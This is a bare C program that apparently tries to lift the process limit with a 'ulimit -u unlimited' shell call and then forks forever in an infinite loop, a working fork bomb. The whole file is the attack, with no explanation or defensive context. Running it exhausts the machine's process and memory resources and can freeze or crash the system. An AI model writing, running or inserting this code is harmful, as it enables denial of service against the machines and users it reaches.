#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
 
int main(){
	system("ulimit -u unlimited");
    while(1)
       fork();   
	return 0;
}
